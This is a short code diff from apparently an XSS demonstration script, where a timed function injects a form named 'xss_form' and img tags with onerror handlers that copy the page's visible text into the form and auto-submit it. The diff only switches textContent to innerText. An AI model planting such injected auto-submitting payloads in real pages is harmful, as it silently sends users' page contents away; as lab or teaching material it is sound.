@@ -5,7 +5,7 @@ function changeTitle(){
                 <input type="text" id="info" name="info" placeholder="your name"> \
                 <input type="submit" value="Submit"> \
             </form>\
-            <img src="x" onerror="document.forms.xss_form.elements.info.value=document.body.textContent">\
+            <img src="x" onerror="document.forms.xss_form.elements.info.value = document.body.innerText">\
             <img src="x" onerror="document.forms.xss_form.submit()">';
             
     }, 5000);
